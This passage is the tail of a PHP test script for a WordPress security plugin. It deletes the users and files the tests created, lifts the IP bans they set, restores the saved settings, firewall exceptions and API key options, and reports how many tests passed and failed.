			}
			Network::delete_option( Salts::ROTATED );
			sleep( 3 );
		}
	}
);

// Clean up everything the tests made.
foreach ( $GLOBALS['sst']['users'] as $sst_id ) {
	if ( is_multisite() ) {
		require_once ABSPATH . 'wp-admin/includes/ms.php';
		revoke_super_admin( $sst_id );
		wpmu_delete_user( $sst_id );
	} else {
		require_once ABSPATH . 'wp-admin/includes/user.php';
		wp_delete_user( $sst_id );
	}
}
foreach ( $GLOBALS['sst']['files'] as $sst_file ) {
	wp_delete_file( $sst_file );
}
foreach ( array_unique( $GLOBALS['sst']['ips'] ) as $sst_ip ) {
	Login_Guard::release( $sst_ip );
	Bans::release( $sst_ip );
}
Network::update_option( Settings::OPTION, $sst_settings );
Network::update_option( Firewall::EXCEPTIONS, $sst_fw );
if ( $sst_key[0] ) {
	Network::update_option( Api::KEY_OPTION, $sst_key[0], false );
	Network::update_option( Api::SCOPE, $sst_key[1], false );
	$sst_key[2] ? Network::update_option( Api::SEALED, $sst_key[2], false ) : Network::delete_option( Api::SEALED );
} else {
	Api::revoke_key();
}

$sst_fail = count( $GLOBALS['sst']['fail'] );
echo "\n" . $GLOBALS['sst']['pass'] . ' passed, ' . $sst_fail . " failed\n";
if ( $sst_fail ) {
	\WP_CLI::halt( 1 );
}
